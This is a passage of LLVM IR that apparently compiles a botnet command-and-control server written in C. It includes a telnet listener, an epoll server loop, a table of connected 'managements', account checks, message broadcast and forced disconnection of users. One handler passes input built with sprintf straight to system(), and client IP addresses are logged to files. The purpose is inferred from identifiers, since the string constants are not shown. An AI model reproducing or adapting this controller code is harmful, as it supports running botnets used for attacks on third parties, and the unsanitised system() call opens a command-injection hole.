; <label>:724:                                    ; preds = %770, %713
  %725 = load i32, i32* %35, align 4
  %726 = icmp slt i32 %725, 1000000
  br i1 %726, label %727, label %773

; <label>:727:                                    ; preds = %724
  %728 = load i32, i32* %35, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %729
  %731 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %730, i32 0, i32 2
  %732 = getelementptr inbounds [20 x i8], [20 x i8]* %731, i32 0, i32 0
  %733 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %734 = call i8* @strstr(i8* %732, i8* %733) #8
  %735 = icmp ne i8* %734, null
  br i1 %735, label %736, label %769

; <label>:736:                                    ; preds = %727
  %737 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %738 = load i32, i32* %4, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %739
  %741 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %740, i32 0, i32 2
  %742 = getelementptr inbounds [20 x i8], [20 x i8]* %741, i32 0, i32 0
  %743 = call i32 (i8*, i8*, ...) @sprintf(i8* %737, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i32 0, i32 0), i8* %742) #7
  %744 = load i32, i32* %35, align 4
  %745 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %746 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %747 = call i64 @strlen(i8* %746) #8
  %748 = call i64 @send(i32 %744, i8* %745, i64 %747, i32 16384)
  %749 = icmp eq i64 %748, -1
  br i1 %749, label %750, label %751

; <label>:750:                                    ; preds = %736
  store i8* null, i8** %2, align 8
  br label %969

; <label>:751:                                    ; preds = %736
  %752 = load i32, i32* %35, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %753
  %755 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %754, i32 0, i32 1
  store i32 0, i32* %755, align 4
  %756 = load i32, i32* %35, align 4
  %757 = call i32 @close(i32 %756)
  %758 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %759 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %760 = call i32 (i8*, i8*, ...) @sprintf(i8* %758, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.83, i32 0, i32 0), i8* %759) #7
  %761 = load i32, i32* %4, align 4
  %762 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %763 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %764 = call i64 @strlen(i8* %763) #8
  %765 = call i64 @send(i32 %761, i8* %762, i64 %764, i32 16384)
  %766 = icmp eq i64 %765, -1
  br i1 %766, label %767, label %768

; <label>:767:                                    ; preds = %751
  store i8* null, i8** %2, align 8
  br label %969

; <label>:768:                                    ; preds = %751
  br label %769

; <label>:769:                                    ; preds = %768, %727
  br label %770

; <label>:770:                                    ; preds = %769
  %771 = load i32, i32* %35, align 4
  %772 = add nsw i32 %771, 1
  store i32 %772, i32* %35, align 4
  br label %724

; <label>:773:                                    ; preds = %724
  br label %824

; <label>:774:                                    ; preds = %709
  %775 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %776 = call i8* @strstr(i8* %775, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0)) #8
  %777 = icmp ne i8* %776, null
  br i1 %777, label %782, label %778

; <label>:778:                                    ; preds = %774
  %779 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %780 = call i8* @strstr(i8* %779, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0)) #8
  %781 = icmp ne i8* %780, null
  br i1 %781, label %782, label %823

; <label>:782:                                    ; preds = %778, %774
  %783 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %784 = call i8* @strtok(i8* %783, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #7
  store i8* %784, i8** %38, align 8
  %785 = load i8*, i8** %38, align 8
  %786 = load i8*, i8** %38, align 8
  %787 = call i64 @strlen(i8* %786) #8
  %788 = getelementptr inbounds i8, i8* %785, i64 %787
  %789 = getelementptr inbounds i8, i8* %788, i64 1
  %790 = call i32 @atoi(i8* %789) #8
  store i32 %790, i32* %39, align 4
  %791 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %792 = load i32, i32* %4, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %793
  %795 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %794, i32 0, i32 2
  %796 = getelementptr inbounds [20 x i8], [20 x i8]* %795, i32 0, i32 0
  %797 = call i32 (i8*, i8*, ...) @sprintf(i8* %791, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i32 0, i32 0), i8* %796) #7
  %798 = load i32, i32* %39, align 4
  %799 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %800 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %801 = call i64 @strlen(i8* %800) #8
  %802 = call i64 @send(i32 %798, i8* %799, i64 %801, i32 16384)
  %803 = icmp eq i64 %802, -1
  br i1 %803, label %804, label %805

; <label>:804:                                    ; preds = %782
  store i8* null, i8** %2, align 8
  br label %969

; <label>:805:                                    ; preds = %782
  %806 = load i32, i32* %39, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %807
  %809 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %808, i32 0, i32 1
  store i32 0, i32* %809, align 4
  %810 = load i32, i32* %39, align 4
  %811 = call i32 @close(i32 %810)
  %812 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %813 = load i32, i32* %39, align 4
  %814 = call i32 (i8*, i8*, ...) @sprintf(i8* %812, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.86, i32 0, i32 0), i32 %813) #7
  %815 = load i32, i32* %4, align 4
  %816 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %817 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %818 = call i64 @strlen(i8* %817) #8
  %819 = call i64 @send(i32 %815, i8* %816, i64 %818, i32 16384)
  %820 = icmp eq i64 %819, -1
  br i1 %820, label %821, label %822

; <label>:821:                                    ; preds = %805
  store i8* null, i8** %2, align 8
  br label %969

; <label>:822:                                    ; preds = %805
  br label %823

; <label>:823:                                    ; preds = %822, %778
  br label %824

; <label>:824:                                    ; preds = %823, %773
  br label %836

; <label>:825:                                    ; preds = %696
  %826 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %827 = call i32 (i8*, i8*, ...) @sprintf(i8* %826, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.87, i32 0, i32 0)) #7
  %828 = load i32, i32* %4, align 4
  %829 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %830 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %831 = call i64 @strlen(i8* %830) #8
  %832 = call i64 @send(i32 %828, i8* %829, i64 %831, i32 16384)
  %833 = icmp eq i64 %832, -1
  br i1 %833, label %834, label %835

; <label>:834:                                    ; preds = %825
  br label %835

; <label>:835:                                    ; preds = %834, %825
  br label %836

; <label>:836:                                    ; preds = %835, %824
  br label %837

; <label>:837:                                    ; preds = %836, %683
  %838 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %839 = call i8* @strstr(i8* %838, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0)) #8
  %840 = icmp ne i8* %839, null
  br i1 %840, label %841, label %910

; <label>:841:                                    ; preds = %837
  %842 = load i8*, i8** %12, align 8
  %843 = load i32, i32* %5, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %844
  %846 = getelementptr inbounds %struct.account, %struct.account* %845, i32 0, i32 2
  %847 = getelementptr inbounds [200 x i8], [200 x i8]* %846, i32 0, i32 0
  %848 = call i32 @strcmp(i8* %842, i8* %847) #8
  %849 = icmp eq i32 %848, 0
  br i1 %849, label %859, label %850

; <label>:850:                                    ; preds = %841
  %851 = load i8*, i8** %13, align 8
  %852 = load i32, i32* %5, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %853
  %855 = getelementptr inbounds %struct.account, %struct.account* %854, i32 0, i32 2
  %856 = getelementptr inbounds [200 x i8], [200 x i8]* %855, i32 0, i32 0
  %857 = call i32 @strcmp(i8* %851, i8* %856) #8
  %858 = icmp eq i32 %857, 0
  br i1 %858, label %859, label %898

; <label>:859:                                    ; preds = %850, %841
  %860 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %861 = call i8* @strtok(i8* %860, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0)) #7
  store i8* %861, i8** %40, align 8
  %862 = load i8*, i8** %40, align 8
  %863 = getelementptr inbounds i8, i8* %862, i64 8
  store i8* %863, i8** %41, align 8
  %864 = load i8*, i8** %41, align 8
  call void @trim(i8* %864)
  %865 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i32 0, i32 0
  %866 = bitcast i8** %865 to i8*
  %867 = load i8*, i8** %41, align 8
  %868 = call i32 (i8*, i8*, ...) @sprintf(i8* %866, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.89, i32 0, i32 0), i8* %867) #7
  %869 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i32 0, i32 0
  %870 = bitcast i8** %869 to i8*
  %871 = call i32 @system(i8* %870)
  %872 = load i32, i32* %5, align 4
  %873 = sext i32 %872 to i64
  %874 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %873
  %875 = getelementptr inbounds %struct.account, %struct.account* %874, i32 0, i32 0
  %876 = getelementptr inbounds [200 x i8], [200 x i8]* %875, i32 0, i32 0
  %877 = load i8*, i8** %41, align 8
  %878 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i32 0, i32 0), i8* %876, i8* %877)
  %879 = load i32, i32* %4, align 4
  %880 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %881 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %882 = call i64 @strlen(i8* %881) #8
  %883 = call i64 @send(i32 %879, i8* %880, i64 %882, i32 16384)
  %884 = icmp eq i64 %883, -1
  br i1 %884, label %885, label %886

; <label>:885:                                    ; preds = %859
  store i8* null, i8** %2, align 8
  br label %969

; <label>:886:                                    ; preds = %859
  %887 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %887, %struct._IO_FILE** %43, align 8
  %888 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %889 = load i32, i32* %5, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %890
  %892 = getelementptr inbounds %struct.account, %struct.account* %891, i32 0, i32 0
  %893 = getelementptr inbounds [200 x i8], [200 x i8]* %892, i32 0, i32 0
  %894 = load i8*, i8** %41, align 8
  %895 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %888, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i32 0, i32 0), i8* %893, i8* %894)
  %896 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %897 = call i32 @fclose(%struct._IO_FILE* %896)
  br label %909

; <label>:898:                                    ; preds = %850
  %899 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %900 = call i32 (i8*, i8*, ...) @sprintf(i8* %899, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %901 = load i32, i32* %4, align 4
  %902 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %903 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %904 = call i64 @strlen(i8* %903) #8
  %905 = call i64 @send(i32 %901, i8* %902, i64 %904, i32 16384)
  %906 = icmp eq i64 %905, -1
  br i1 %906, label %907, label %908

; <label>:907:                                    ; preds = %898
  br label %908

; <label>:908:                                    ; preds = %907, %898
  br label %909

; <label>:909:                                    ; preds = %908, %886
  br label %910

; <label>:910:                                    ; preds = %909, %837
  %911 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %912 = call i8* @strstr(i8* %911, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.91, i32 0, i32 0)) #8
  %913 = icmp ne i8* %912, null
  br i1 %913, label %914, label %915

; <label>:914:                                    ; preds = %910
  br label %960

; <label>:915:                                    ; preds = %910
  %916 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %916)
  %917 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %918 = load i32, i32* %5, align 4
  %919 = sext i32 %918 to i64
  %920 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %919
  %921 = getelementptr inbounds %struct.account, %struct.account* %920, i32 0, i32 0
  %922 = getelementptr inbounds [200 x i8], [200 x i8]* %921, i32 0, i32 0
  %923 = call i32 (i8*, i8*, ...) @sprintf(i8* %917, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i32 0, i32 0), i8* %922) #7
  %924 = load i32, i32* %4, align 4
  %925 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %926 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %927 = call i64 @strlen(i8* %926) #8
  %928 = call i64 @send(i32 %924, i8* %925, i64 %927, i32 16384)
  %929 = icmp eq i64 %928, -1
  br i1 %929, label %930, label %931

; <label>:930:                                    ; preds = %915
  br label %960

; <label>:931:                                    ; preds = %915
  %932 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %933 = call i64 @strlen(i8* %932) #8
  %934 = icmp eq i64 %933, 0
  br i1 %934, label %935, label %936

; <label>:935:                                    ; preds = %931
  br label %224

; <label>:936:                                    ; preds = %931
  %937 = load i32, i32* %5, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %938
  %940 = getelementptr inbounds %struct.account, %struct.account* %939, i32 0, i32 0
  %941 = getelementptr inbounds [200 x i8], [200 x i8]* %940, i32 0, i32 0
  %942 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %943 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i32 0, i32 0), i8* %941, i8* %942)
  %944 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %944, %struct._IO_FILE** %44, align 8
  %945 = load %struct._IO_FILE*, %struct._IO_FILE** %44, align 8
  %946 = load i32, i32* %5, align 4
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %947
  %949 = getelementptr inbounds %struct.account, %struct.account* %948, i32 0, i32 0
  %950 = getelementptr inbounds [200 x i8], [200 x i8]* %949, i32 0, i32 0
  %951 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %952 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %945, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i32 0, i32 0), i8* %950, i8* %951)
  %953 = load %struct._IO_FILE*, %struct._IO_FILE** %44, align 8
  %954 = call i32 @fclose(%struct._IO_FILE* %953)
  %955 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %956 = load i32, i32* %4, align 4
  %957 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  call void @broadcast(i8* %955, i32 %956, i8* %957)
  %958 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %958, i8 0, i64 2048, i32 16, i1 false)
  br label %224

; <label>:959:                                    ; preds = %224
  br label %960

; <label>:960:                                    ; preds = %959, %930, %914, %596, %549, %303, %286, %205, %190, %179, %178, %159, %153, %119, %113, %103, %96
  %961 = load i32, i32* %4, align 4
  %962 = sext i32 %961 to i64
  %963 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %962
  %964 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %963, i32 0, i32 1
  store i32 0, i32* %964, align 4
  %965 = load i32, i32* %4, align 4
  %966 = call i32 @close(i32 %965)
  %967 = load volatile i32, i32* @managesConnected, align 4
  %968 = add nsw i32 %967, -1
  store volatile i32 %968, i32* @managesConnected, align 4
  br label %969

; <label>:969:                                    ; preds = %960, %885, %821, %804, %767, %750, %664, %629
  %970 = load i8*, i8** %2, align 8
  ret i8* %970
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetListener(i32) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %11 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %11, i32* %4, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %15

; <label>:14:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i32 0, i32 0))
  br label %15

; <label>:15:                                     ; preds = %14, %1
  %16 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %3, align 4
  %21 = trunc i32 %20 to i16
  %22 = call zeroext i16 @htons(i16 zeroext %21) #9
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %4, align 4
  %25 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %26 = call i32 @bind(i32 %24, %struct.sockaddr* %25, i32 16) #7
  %27 = icmp slt i32 %26, 0
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %15
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.95, i32 0, i32 0))
  br label %29

; <label>:29:                                     ; preds = %28, %15
  %30 = load i32, i32* %4, align 4
  %31 = call i32 @listen(i32 %30, i32 5) #7
  store i32 16, i32* %6, align 4
  br label %32

; <label>:32:                                     ; preds = %69, %29
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.96, i32 0, i32 0))
  %34 = bitcast %struct.sockaddr_in* %8 to { i64, i64 }*
  %35 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %34, i32 0, i32 0
  %36 = load i64, i64* %35, align 4
  %37 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %34, i32 0, i32 1
  %38 = load i64, i64* %37, align 4
  call void @client_addr(i64 %36, i64 %38)
  %39 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %39, %struct._IO_FILE** %9, align 8
  %40 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  %44 = and i32 %43, 255
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %46 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %45, i32 0, i32 0
  %47 = load i32, i32* %46, align 4
  %48 = and i32 %47, 65280
  %49 = lshr i32 %48, 8
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %51 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %50, i32 0, i32 0
  %52 = load i32, i32* %51, align 4
  %53 = and i32 %52, 16711680
  %54 = lshr i32 %53, 16
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %56 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, -16777216
  %59 = lshr i32 %58, 24
  %60 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %40, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.97, i32 0, i32 0), i32 %44, i32 %49, i32 %54, i32 %59)
  %61 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %62 = call i32 @fclose(%struct._IO_FILE* %61)
  %63 = load i32, i32* %4, align 4
  %64 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %65 = call i32 @accept(i32 %63, %struct.sockaddr* %64, i32* %6)
  store i32 %65, i32* %5, align 4
  %66 = load i32, i32* %5, align 4
  %67 = icmp slt i32 %66, 0
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %32
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.98, i32 0, i32 0))
  br label %69

; <label>:69:                                     ; preds = %68, %32
  %70 = load i32, i32* %5, align 4
  %71 = sext i32 %70 to i64
  %72 = inttoptr i64 %71 to i8*
  %73 = call i32 @pthread_create(i64* %10, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %72) #7
  br label %32
                                                  ; No predecessors!
  %75 = load i8*, i8** %2, align 8
  ret i8* %75
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #3

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #4

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca [20 x i8], align 16
  %13 = alloca [20 x i8], align 16
  %14 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %15 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %16 = load i32, i32* %5, align 4
  %17 = icmp ne i32 %16, 4
  br i1 %17, label %18, label %24

; <label>:18:                                     ; preds = %3
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i8**, i8*** %6, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.99, i32 0, i32 0), i8* %22)
  call void @exit(i32 1) #10
  unreachable

; <label>:24:                                     ; preds = %3
  %25 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0))
  store %struct._IO_FILE* %25, %struct._IO_FILE** @fileFD, align 8
  %26 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0))
  store %struct._IO_FILE* %26, %struct._IO_FILE** @kfileFD, align 8
  %27 = load i8**, i8*** %6, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 3
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @atoi(i8* %29) #8
  store i32 %30, i32* %10, align 4
  %31 = load i8**, i8*** %6, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33) #8
  store i32 %34, i32* %9, align 4
  %35 = load i32, i32* %9, align 4
  %36 = icmp sgt i32 %35, 850
  br i1 %36, label %37, label %39

; <label>:37:                                     ; preds = %24
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.103, i32 0, i32 0))
  ret i32 0

; <label>:39:                                     ; preds = %24
  %40 = load i32, i32* %10, align 4
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.104, i32 0, i32 0), i32 %40)
  %42 = load i8**, i8*** %6, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @create_and_bind(i8* %44)
  store volatile i32 %45, i32* @listenFD, align 4
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %49

; <label>:48:                                     ; preds = %39
  call void @abort() #10
  unreachable

; <label>:49:                                     ; preds = %39
  %50 = load volatile i32, i32* @listenFD, align 4
  %51 = call i32 @make_socket_non_blocking(i32 %50)
  store i32 %51, i32* %8, align 4
  %52 = load i32, i32* %8, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %55

; <label>:54:                                     ; preds = %49
  call void @abort() #10
  unreachable

; <label>:55:                                     ; preds = %49
  %56 = load volatile i32, i32* @listenFD, align 4
  %57 = call i32 @listen(i32 %56, i32 128) #7
  store i32 %57, i32* %8, align 4
  %58 = load i32, i32* %8, align 4
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %55
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:61:                                     ; preds = %55
  %62 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %62, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @epollFD, align 4
  %64 = icmp eq i32 %63, -1
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %61
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.106, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:66:                                     ; preds = %61
  %67 = load volatile i32, i32* @listenFD, align 4
  %68 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %69 = bitcast %union.epoll_data* %68 to i32*
  store i32 %67, i32* %69, align 1
  %70 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %70, align 1
  %71 = load volatile i32, i32* @epollFD, align 4
